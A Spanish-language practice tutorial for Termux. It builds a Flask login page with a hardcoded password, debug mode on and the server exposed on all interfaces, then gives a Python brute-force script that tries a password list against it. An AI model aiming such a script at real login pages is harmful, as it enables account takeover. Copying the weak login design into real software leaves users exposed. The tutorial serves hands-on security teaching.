# LABORATORIO365

### 1. Configuración de Termux

Primero, asegúrate de tener Python y Flask instalados en Termux. Si no lo has hecho, ejecuta los siguientes comandos:

```bash
pkg install python
pip install Flask
```

### 2. Crear la Página Web

Crea un archivo llamado `app.py` que contendrá el servidor Flask y la lógica de la página de inicio de sesión:

```bash
nano app.py
```

Luego, inserta el siguiente código:

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Contraseña correcta
correct_password = "secreta123"

# Página de inicio de sesión
html_template = """
<!doctype html>
<html>
<head>
    <title>Prueba de Penetración</title>
</head>
<body>
    <h1>Iniciar Sesión</h1>
    <form method="POST">
        <input type="password" name="password" placeholder="Contraseña" required>
        <button type="submit">Entrar</button>
    </form>
    {% if message %}
        <p>{{ message }}</p>
    {% endif %}
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    message = ""
    if request.method == 'POST':
        password = request.form.get('password')
        if password == correct_password:
            message = "¡Acceso concedido!"
        else:
            message = "Contraseña incorrecta. Inténtalo de nuevo."
    return render_template_string(html_template, message=message)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

Este código crea una simple página web que solicita una contraseña. Si se introduce la contraseña correcta (`secreta123`), se concede acceso; de lo contrario, se muestra un mensaje de error.

### 3. Ejecutar la Aplicación

Guarda y cierra el archivo `app.py`. Luego, ejecuta el servidor Flask con el siguiente comando:

```bash
python app.py
```

La aplicación estará disponible en `http://127.0.0.1:5000/`.

### 4. Crear un Script en Python para Averiguar la Contraseña

Ahora, crearemos un script en Python que intente averiguar la contraseña. Crea un nuevo archivo llamado `brute_force.py`:

```bash
nano brute_force.py
```

Inserta el siguiente código:

```python
import requests

# URL de la página de inicio de sesión
url = "http://127.0.0.1:5000/"
# Lista de contraseñas a probar (puedes agregar más)
passwords = ["123456", "password", "123456789", "secreta123", "qwerty", "abc123"]

for password in passwords:
    response = requests.post(url, data={"password": password})
    
    if "¡Acceso concedido!" in response.text:
        print(f"Contraseña encontrada: {password}")
        break
    else:
        print(f"Contraseña incorrecta: {password}")
```

### 5. Ejecutar el Script de Fuerza Bruta

Guarda y cierra el archivo `brute_force.py`. Asegúrate de que la aplicación Flask esté en ejecución y luego ejecuta el script de fuerza bruta:

```bash
python brute_force.py
```

### 6. Consideraciones Éticas

Recuerda que realizar pruebas de penetración y ataques de fuerza bruta deben hacerse solo en entornos donde tengas permiso explícito para hacerlo. El uso indebido de estas técnicas puede tener consecuencias legales.

### Resumen

Hemos creado una sencilla aplicación web de inicio de sesión con Flask y un script en Python para intentar averiguar la contraseña mediante un ataque de fuerza bruta. Esto es solo para fines educativos y de práctica. ¡Asegúrate de usarlo de manera responsable!
